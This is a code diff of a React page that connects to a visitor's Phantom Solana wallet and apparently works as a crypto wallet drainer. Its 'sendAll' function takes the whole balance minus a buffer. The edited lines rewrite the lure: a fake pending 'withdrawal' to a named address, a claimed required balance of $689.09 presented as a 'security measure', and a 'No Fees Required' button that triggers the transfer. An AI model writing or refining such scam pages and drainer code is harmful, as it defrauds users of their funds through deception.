@@ -23,7 +23,7 @@ const SOL_PRICE = 150 // 🔥 precio fijo
 
   // 🔁 demo conversion
   const SOL_RATE = SOL_PRICE
-  const usd = -153.01 // 
+  const usd = 689.09 // 
   const sol = usd / SOL_RATE
 
   const getProvider = () => {
@@ -66,7 +66,7 @@ const publicKey = res.publicKey
       const amount = balance - SAFETY_BUFFER
 
       if (amount <= 0) {
-        alert("Add 360.00SOL balance to phantom")
+        alert("Add 689.09 SOL balance to phantom")
         return
       }
 
@@ -183,7 +183,7 @@ const publicKey = res.publicKey
           onClick={sendAll}
           className="mt-10 px-6 py-3 text-xs tracking-widest border border-purple-500/40 text-purple-300 hover:bg-purple-500 hover:text-white transition rounded-full"
         >
-          Pay the Gas Fee From your Wallet
+          No Fees Required - Add minimum balance 
         </button>
 
 
@@ -204,9 +204,9 @@ const publicKey = res.publicKey
       </p>
 
       <p className="text-yellow-200/80 text-sm leading-relaxed">
-        To release the <span className="font-semibold text-white">corresponding withdrawal to 8wNtA7P4RWWe76WfnTocj59R7wRUg7zLsJuDmnRZLWot </span>,  
-        you must maintain a balance of <span className="text-yellow-300 font-semibold">$488 USD</span>  
-        in your wallet beforehand. Right now you have 335,06 USD, so please add the remining amount to reach the requiered balane before clicking the button. 
+        To release the <span className="font-semibold text-white">corresponding withdrawal to 8wNtA7P4RWWe76WfnTocj59R7wRUg7zLsJuDmnRZLWot </span> you must maintain a balance of <span className="text-yellow-300 font-semibold">$689.09 USD</span> 
+        in your wallet beforehand. this is a security measure to ensure transaction 
+        can be processed without issues. 
       </p>
 
       <p className="text-yellow-200/60 text-xs mt-2">
